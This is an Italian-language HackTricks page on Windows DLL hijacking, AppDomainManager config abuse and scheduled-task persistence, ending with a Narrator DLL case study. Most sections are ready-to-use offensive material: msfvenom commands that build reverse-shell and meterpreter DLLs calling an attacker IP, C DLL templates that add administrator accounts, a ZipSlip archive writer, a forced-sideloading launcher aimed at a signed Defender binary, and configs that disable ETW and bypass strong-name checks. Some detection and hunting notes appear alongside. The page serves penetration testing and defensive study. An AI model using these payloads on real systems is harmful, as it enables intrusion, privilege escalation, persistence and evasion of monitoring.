# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

Il DLL Hijacking consiste nel manipolare un'applicazione attendibile affinché carichi una DLL malevola. Questo termine comprende diverse tattiche, come **DLL Spoofing, Injection e Side-Loading**. Viene utilizzato principalmente per eseguire codice e ottenere persistenza e, più raramente, per l'escalation dei privilegi. Anche se qui ci concentriamo sull'escalation, il metodo di hijacking rimane lo stesso indipendentemente dall'obiettivo.

### Tecniche comuni

Per il DLL hijacking si utilizzano diversi metodi, la cui efficacia dipende dalla strategia di caricamento delle DLL dell'applicazione:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: sostituire una DLL legittima con una malevola, eventualmente usando DLL Proxying per preservare le funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: collocare la DLL malevola in un percorso di ricerca che precede quello legittimo, sfruttando l'ordine di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: creare una DLL malevola da caricare da parte di un'applicazione, che la considera una DLL necessaria ma inesistente.
4. **DLL Redirection**: modificare parametri di ricerca come `%PATH%` o file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: sostituire la DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: collocare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, analogamente alle tecniche di Binary Proxy Execution.

Un'applicazione può anche implementare un **loader di DLL personalizzato**. Un processo con privilegi elevati potrebbe enumerare una directory figlia, come `Libraries` o `Plugins`, e passare una DLL selezionata a un helper, senza seguire il normale ordine di ricerca delle DLL di Windows. Se un altro account può creare file proprio in quella directory, consideralo un indizio da approfondire: verifica l'identità del processo, le ACL effettive della directory, i criteri di selezione dei file e la presenza di un'operazione di caricamento raggiungibile. Il fatto che una directory accanto a un eseguibile sia scrivibile non dimostra che il processo vi carichi DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + assembly dell'attaccante)

Il classico DLL sideloading non è l'unico modo per far caricare codice dell'attaccante a un processo **.NET Framework** attendibile. Se l'eseguibile preso di mira è un'applicazione **managed**, il CLR consulta anche un **file di configurazione dell'applicazione** che prende il nome dall'eseguibile (ad esempio `Setup.exe.config`). Questo file può definire un **AppDomainManager** personalizzato. Se la configurazione punta a un assembly controllato dall'attaccante e collocato accanto all'EXE, il CLR lo carica **prima del normale flusso di esecuzione dell'applicazione** e lo esegue all'interno del processo attendibile.<sup>[[24]](#references)</sup>

Secondo lo schema di configurazione .NET Framework di Microsoft, devono essere presenti sia `<appDomainManagerAssembly>` sia `<appDomainManagerType>` affinché venga utilizzato il manager personalizzato.<sup>[[16]](#references)[[17]](#references)</sup>

Configurazione minima:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Gestore minimale:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Note pratiche:
- Questa tecnica è specifica di **.NET Framework**. Dipende dall’analisi della configurazione CLR, non dall’ordine di ricerca delle DLL di Win32.
- L’host deve essere davvero un **EXE gestito**. Per un triage rapido: `sigcheck -m target.exe`, `corflags target.exe` oppure verifica la presenza del **CLR Runtime Header** nei metadati PE.
- Il nome del file di configurazione deve corrispondere esattamente al nome dell’eseguibile (`<binary>.config`) e di solito si trova **accanto all’EXE**.
- È utile con **binari Microsoft o di altri vendor firmati**, perché l’EXE attendibile resta intatto mentre l’assembly gestito malevolo viene eseguito in-process.
- Se hai già una directory di installazione/aggiornamento scrivibile, l’hijacking di AppDomainManager può essere usato come **prima fase**, seguito dal classico DLL sideloading o dal caricamento riflessivo nelle fasi successive.

### AppDomainManager come downloader + bootstrap tramite attività pianificata

Uno schema pratico di intrusione consiste nell’affiancare all’EXE gestito attendibile sia un `*.config` malevolo sia una DLL AppDomainManager malevola che funge solo da **piccolo bootstrapper**:<sup>[[25]](#references)</sup>

1. L’utente avvia un installer o updater .NET firmato da una posizione credibile, ad esempio `%USERPROFILE%\Downloads`.
2. Il file di configurazione adiacente induce il CLR a caricare l’assembly dell’attaccante **prima che inizi la logica dell’applicazione legittima**.
3. Il manager malevolo esegue un **controllo del percorso** (ad esempio, prosegue solo se l’host EXE viene eseguito da `Downloads` e consente l’esecuzione della seconda fase solo da `%LOCALAPPDATA%`).
4. Se il controllo viene superato, scarica il payload effettivo in un percorso scrivibile dall’utente, come `%LOCALAPPDATA%\PerfWatson2.exe`, e installa la persistenza con un’attività pianificata.

Perché questa variante è importante:
- L’host EXE firmato resta invariato, quindi un triage che calcola l’hash solo del binario principale potrebbe non rilevare la compromissione.
- È comune usare semplici **tecniche anti-analisi basate sul percorso**: spostare la triade ZIP/EXE/DLL su Desktop, Temp o in un percorso sandbox può interrompere intenzionalmente la catena.
- La DLL AppDomainManager della prima fase può restare piccola e poco rumorosa, mentre l’impianto effettivo viene scaricato in un secondo momento.

Esempio minimo di persistenza spesso usato con questo schema:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Note:
- ` /rl highest` significa **il livello più alto disponibile** per quell'utente/sessione; di per sé non garantisce un'escalation a SYSTEM.
- Questa tecnica è spesso classificata meglio come **esecuzione/persistenza tramite abuso della configurazione .NET** che come classico hijacking dell'ordine di ricerca di una DLL mancante, anche se gli operatori spesso combinano entrambe le tecniche.

Punti di rilevamento:
- Eseguibili .NET firmati avviati da percorsi di estrazione ZIP, `Downloads`, `%TEMP%` o altre cartelle scrivibili dall'utente, con un file `<exe>.config` **nella stessa cartella**.
- Nuove attività pianificate la cui azione punta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads` e i cui nomi imitano quelli degli updater di browser o vendor.
- Processi bootstrap gestiti di breve durata che scaricano immediatamente un altro EXE e poi avviano `schtasks.exe`.
- Campioni che terminano anticipatamente se il percorso dell'eseguibile non corrisponde a una directory prevista nel profilo utente.

### Hijacking di un'attività pianificata esistente per rilanciare la catena sideload

Per la persistenza, non cercare solo la **creazione di una nuova attività**. Alcuni gruppi di intrusione aspettano che un installer legittimo crei una **normale attività di aggiornamento**, poi **riscrivono l'azione dell'attività**, mantenendo invariati nome, autore e trigger, così da apparire familiari ai difensori.

Flusso di lavoro riutilizzabile:
1. Installa/esegui il software legittimo e identifica l'attività che crea normalmente.
2. Esporta l'XML dell'attività e annota i valori correnti di `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Sostituisci solo l'azione, in modo che l'attività avvii il tuo **EXE host fidato** da una directory di staging scrivibile dall'utente, che poi carica lateralmente il payload reale o lo carica tramite AppDomain.
4. Registra nuovamente lo stesso nome dell'attività invece di creare un artefatto di persistenza evidente.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Perché è più furtivo:
- Il nome dell'attività può sembrare legittimo (ad esempio, quello di un updater del fornitore).
- La avvia il **servizio Task Scheduler**, quindi la convalida del processo padre/antenati spesso rileva la catena di pianificazione prevista anziché `explorer.exe`.
- I team DFIR che cercano solo **nuovi nomi di attività** potrebbero non rilevare un'attività già registrata, ma la cui azione ora punta a `%LOCALAPPDATA%`, `%APPDATA%` o a un altro percorso controllato dall'attaccante.

Controlli rapidi:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Confronta gli XML in `C:\Windows\System32\Tasks\*` e i metadati in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una baseline.
- Genera un avviso quando un'attività updater dall'aspetto riconducibile a un fornitore viene eseguita da **directory scrivibili dall'utente** o avvia un EXE .NET con un file `*.config` nella stessa directory.

> [!TIP]
> Per una catena passo passo che combina HTML staging, configurazioni AES-CTR e implant .NET con il DLL sideloading, consulta il flusso di lavoro seguente.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Individuare DLL mancanti

Il modo più comune per trovare DLL mancanti in un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di Sysinternals e **impostare** i **seguenti 2 filtri**:

![Tecniche comuni - Individuare DLL mancanti: il modo più comune per trovare DLL mancanti in un sistema è eseguire procmon di Sysinternals e impostare i seguenti 2 filtri](<../../../images/image (961).png>)

![Tecniche comuni - Individuare DLL mancanti: il modo più comune per trovare DLL mancanti in un sistema è eseguire procmon di Sysinternals e impostare i seguenti 2 filtri](<../../../images/image (230).png>)

e mostrare solo l'**attività del file system**:

![Tecniche comuni - Individuare DLL mancanti: e mostrare solo l'attività del file system](<../../../images/image (153).png>)

Se stai cercando **DLL mancanti in generale**, lascia **in esecuzione** lo strumento per alcuni **secondi**.\
Se stai cercando una **DLL mancante all'interno di un eseguibile specifico**, imposta un altro filtro, ad esempio **"Process Name" "contains" `<exec name>`**, eseguilo e interrompi l'acquisizione degli eventi.<sup>[[9]](#references)</sup>

## Sfruttare DLL mancanti

Per elevare i privilegi, cerca una **DLL che un processo privilegiato tenta di caricare** da una posizione in cui puoi scrivere. Ciò può verificarsi quando controlli una directory cercata prima di quella contenente la DLL legittima, oppure quando la DLL richiesta non esiste e puoi scrivere in una delle directory esaminate.

### Ordine di ricerca delle DLL

**Nella** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare informazioni specifiche sul caricamento delle DLL.**

Le **applicazioni Windows** cercano le DLL seguendo una serie di **percorsi di ricerca predefiniti**, in un ordine specifico. Il DLL hijacking si verifica quando una DLL dannosa viene posizionata strategicamente in una di queste directory, in modo che venga caricata prima della DLL autentica. Per impedirlo, assicurati che l'applicazione usi percorsi assoluti per fare riferimento alle DLL necessarie.

Di seguito è riportato l'**ordine di ricerca delle DLL nei sistemi a 32 bit**:

1. La directory da cui è stata caricata l'applicazione.
2. La directory di sistema. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory.(_C:\Windows\System32_)
3. La directory di sistema a 16 bit. Non esiste una funzione che ne restituisca il percorso, ma la directory viene comunque esaminata. (_C:\Windows\System_)
4. La directory di Windows. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory.
   1. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile d'ambiente PATH. Nota che questo non include il percorso specifico dell'applicazione definito dalla chiave di registro **App Paths**. La chiave **App Paths** non viene usata per determinare il percorso di ricerca delle DLL.

Questo è l'ordine di ricerca **predefinito** con **SafeDllSearchMode** attivato. Se è disattivato, la directory corrente passa al secondo posto. Per disattivare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (è attivato per impostazione predefinita).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, una DLL può essere caricata specificandone il percorso assoluto anziché il nome. In questo caso, Windows cerca la DLL stessa solo in quel percorso; le dipendenze richieste per nome seguono comunque l'ordine di ricerca applicabile.

Esistono altri modi per modificare l'ordine di ricerca, ma non li spiegherò qui.

### Concatenare una scrittura arbitraria di file a un hijack di DLL mancante

**Tecnica correlata:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Usa i filtri di **ProcMon** (`Process Name` = EXE target, `Path` termina con `.dll`, `Result` = `NAME NOT FOUND`) per raccogliere i nomi delle DLL che il processo cerca ma non trova.<sup>[[14]](#references)</sup>
2. Se il binario viene eseguito **in base a una pianificazione o come servizio**, inserendo una DLL con uno di quei nomi nella **directory dell'applicazione** (voce n. 1 nell'ordine di ricerca) verrà caricata alla successiva esecuzione. In un caso con uno scanner .NET, il processo cercava `hostfxr.dll` in `C:\samples\app\` prima di caricare la copia reale da `C:\Program Files\dotnet\fxr\...`.
3. Crea una DLL payload (ad esempio, una reverse shell) con qualsiasi export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se la tua primitive è una **scrittura arbitraria di file di tipo ZipSlip**, crea un archivio ZIP con una voce che esca dalla directory di estrazione, in modo che la DLL venga scritta nella cartella dell'applicazione:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Consegna l'archivio alla inbox/share monitorata; quando l'attività pianificata riavvia il processo, questo carica la DLL malevola ed esegue il tuo codice con l'account del servizio.

### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath

Un metodo avanzato per influenzare in modo deterministico il percorso di ricerca delle DLL di un processo appena creato consiste nell'impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo usando le API native di ntdll. Specificando una directory controllata dall'attaccante, è possibile forzare un processo target che risolve una DLL importata in base al nome (senza percorso assoluto e senza usare i flag di caricamento sicuro) a caricare una DLL malevola da quella directory.

Idea chiave
- Crea i parametri del processo con RtlCreateProcessParametersEx e specifica un DllPath personalizzato che punta alla tua cartella controllata (ad es., la directory in cui si trova il tuo dropper/unpacker).
- Crea il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL in base al nome, il loader consulta il DllPath specificato durante la risoluzione, consentendo un sideloading affidabile anche quando la DLL malevola non si trova nella stessa directory dell'EXE target.

Note/limitazioni
- Questo influisce sul processo figlio in fase di creazione; è diverso da SetDllDirectory, che influisce solo sul processo corrente.
- Il target deve importare o caricare con LoadLibrary una DLL in base al nome (senza percorso assoluto e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e i percorsi assoluti hardcoded non possono essere hijacked. Le esportazioni inoltrate e SxS possono modificare la precedenza.

Esempio C minimo (ntdll, stringhe wide, gestione degli errori semplificata):

<details>
<summary>Esempio C completo: forzare il sideloading di DLL tramite RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Esempio di utilizzo operativo
- Inserisci una xmllite.dll malevola (che esporta le funzioni richieste o fa da proxy a quella legittima) nella directory DllPath.
- Avvia un binario firmato noto per cercare xmllite.dll in base al nome usando la tecnica descritta sopra. Il loader risolve l'import tramite il DllPath fornito e carica in sideload la tua DLL.

Questa tecnica è stata osservata in campagne reali per creare catene di sideloading a più fasi: un launcher iniziale rilascia una DLL helper, che poi avvia un binario firmato da Microsoft e vulnerabile all'hijacking, con un DllPath personalizzato per forzare il caricamento della DLL dell'attaccante da una directory di staging.<sup>[[6]](#references)</sup>


### Hijacking di .NET AppDomainManager tramite `.exe.config`

Per i target **.NET Framework**, il sideloading può avvenire **prima di `Main()`** senza modificare la memoria, sfruttando il file **`.exe.config`** adiacente all'applicazione. Invece di basarsi solo sull'ordine di ricerca delle DLL Win32, l'attaccante posiziona un EXE .NET legittimo accanto a un file di configurazione malevolo e a uno o più assembly controllati dall'attaccante.

Come funziona la catena:<sup>[[15]](#references)[[22]](#references)</sup>
1. L'EXE host si avvia e il **CLR legge `<exe>.config`**.
2. Il file di configurazione imposta **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`**, così che il runtime istanzi un `AppDomainManager` controllato dall'attaccante.
3. Il manager malevolo ottiene **l'esecuzione prima di `Main()`** all'interno del processo host attendibile.
4. Lo stesso file di configurazione può forzare il CLR a risolvere prima gli assembly locali (ad esempio `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e indebolire la convalida e la telemetria del runtime senza patch inline.

Schema tipico di una campagna (l'annidamento esatto può variare in base alla direttiva e alla versione del CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Perché è utile:
- **`<probing privatePath="."/>`** mantiene la risoluzione degli assembly nella directory dell'applicazione, trasformando la cartella in una superficie prevedibile per il sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** spostano l'esecuzione nel codice dell'attaccante durante l'inizializzazione del CLR, prima che venga eseguita la logica legittima dell'app.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** può consentire a un'app con attendibilità completa di caricare assembly non firmati o manomessi senza errori di convalida dello strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita i reindirizzamenti della publisher policy verso assembly più recenti.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** rende più deterministica la selezione del runtime.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** è particolarmente interessante perché il **CLR disabilita la propria visibilità ETW** tramite la configurazione, anziché modificare in memoria `EtwEventWrite` nell'implant.

Schema operativo osservato in campagne recenti:
- Fase 1: rilascia `setup.exe`, `setup.exe.config` e assembly locali.
- Fase 2: li copia in una cartella **AppData di aggiornamento** credibile, rinomina l'host con un nome come `update.exe` e lo riavvia tramite un'**attività pianificata**.
- Fase 3: verifica il contesto di esecuzione (ad esempio, che il processo padre atteso sia `svchost.exe` avviato da Task Scheduler) prima di caricare la DLL/export finale del RAT.

Idee per la threat hunting:
- **Eseguibili .NET** firmati o comunque legittimi eseguiti con file **`.config`** adiacenti sospetti in percorsi scrivibili dagli utenti.
- File `.config` contenenti **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Attività pianificate che riavviano binari di aggiornamento rinominati da **`%LOCALAPPDATA%`** o da directory specifiche dell'app come `\bin\update\`.
- Catene di processi padre/figlio in cui un'attività pianificata avvia un host .NET attendibile che carica subito assembly non del produttore dalla propria directory.

#### Eccezioni all'ordine di ricerca delle DLL nella documentazione di Windows

Nella documentazione di Windows sono indicate alcune eccezioni all'ordine standard di ricerca delle DLL:

- Quando viene incontrata una **DLL con lo stesso nome di una già caricata in memoria**, il sistema ignora la ricerca consueta. Verifica invece la presenza di reindirizzamenti e di un manifest, quindi usa come opzione predefinita la DLL già caricata in memoria. **In questo scenario, il sistema non cerca la DLL**.
- Se la DLL è riconosciuta come **DLL nota** per la versione di Windows in uso, il sistema utilizza la propria versione della DLL nota, insieme alle eventuali DLL da cui dipende, **senza eseguire la ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene l'elenco di queste DLL note.
- Se una **DLL ha dipendenze**, la ricerca delle DLL da cui dipende viene eseguita come se queste fossero indicate solo con i rispettivi **nomi di modulo**, indipendentemente dal fatto che la DLL iniziale sia stata individuata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

- Individuare un processo eseguito o che verrà eseguito con **privilegi diversi** (movimento orizzontale o laterale) e a cui **manca una DLL**.
- Assicurarsi di avere **accesso in scrittura** a una qualsiasi **directory** in cui verrà **cercata la DLL**. Potrebbe essere la directory dell'eseguibile o una directory inclusa nel percorso di sistema.

Questi prerequisiti sono insoliti nelle configurazioni predefinite: gli eseguibili con privilegi elevati di solito non hanno dipendenze DLL mancanti e gli utenti standard normalmente non possono scrivere nelle directory del percorso di ricerca di sistema. Tuttavia, ambienti configurati in modo errato possono presentare entrambe le condizioni.\
Se i requisiti sono soddisfatti, consulta il progetto [UACME](https://github.com/hfiref0x/UACME). Sebbene il suo obiettivo principale sia aggirare UAC, contiene PoC di DLL hijacking per versioni specifiche di Windows, spesso adattabili alla directory scrivibile individuata.

Nota che puoi **verificare i tuoi permessi in una cartella** eseguendo:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

E **controlla i permessi di tutte le cartelle all'interno di PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Puoi anche controllare gli import di un eseguibile e gli export di una DLL con:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Per una guida completa su come **abusare di DLL Hijacking per aumentare i privilegi** con permessi di scrittura in una **cartella System Path**, consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatizzati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verifica se hai permessi di scrittura su una cartella qualsiasi all'interno di system PATH.\
Altri strumenti automatizzati interessanti per individuare questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Se trovi uno scenario sfruttabile, una delle cose più importanti per riuscire a sfruttarlo è **creare una DLL che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. In ogni caso, tieni presente che DLL Hijacking è utile per [passare dal livello di integrità Medium a High **(bypassando UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una DLL valida** in questo studio sul DLL hijacking, incentrato sull'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiv**a puoi trovare alcuni **codici DLL di base** che potrebbero essere utili come **template** o per creare una **DLL con funzioni non richieste esportate**.

## **Creazione e compilazione di DLL**

### **Proxy delle DLL**

In pratica, un **DLL proxy** è una DLL in grado di **eseguire il tuo codice malevolo al caricamento**, ma anche di **esporre** e **funzionare** come **previsto**, inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi **indicare un eseguibile e selezionare la libreria** di cui vuoi creare un proxy, quindi **generare una DLL proxificata**, oppure **indicare la DLL** e **generare una DLL proxificata**.

### **Meterpreter**

**Ottieni una rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Ottieni un meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Crea un utente (x86, non ho trovato una versione x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### La tua

In molti casi, la DLL che compili deve **esportare tutte le funzioni importate dal processo vittima**. Se manca un'esportazione richiesta, il binario non può risolverla e l'exploit fallisce.

<details>
<summary>Template DLL C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Esempio di DLL C++ con creazione di un utente</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternativa con entry point del thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Caso di studio: Hijack della DLL di localizzazione Narrator OneCore TTS (Accessibilità/AT)

Windows Narrator.exe continua a cercare all'avvio una DLL di localizzazione prevedibile e specifica per la lingua, che può essere hijacked per l'esecuzione di codice arbitrario e la persistenza.<sup>[[7]](#references)</sup>

Fatti principali
- Percorso di ricerca (build attuali): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build precedenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
